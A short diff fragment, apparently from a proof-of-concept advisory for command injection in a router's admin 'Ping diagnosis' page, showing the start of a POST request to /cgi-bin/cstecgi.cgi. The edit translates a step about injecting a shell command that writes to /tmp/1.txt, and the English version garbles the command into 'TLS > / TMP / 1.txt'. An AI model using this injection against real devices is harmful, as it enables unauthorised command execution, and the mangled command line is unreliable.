@@ -6,7 +6,7 @@
 
 <b>POC:</b>  
 After the administrator logs in, enter "system tools" - > "Ping diagnosis" page  
-执行tls>/tmp/1.txt命令  
+Execute the TLS > / TMP / 1.txt command  
 ```
 POST /cgi-bin/cstecgi.cgi HTTP/1.1
 Host: 192.168.0.1  
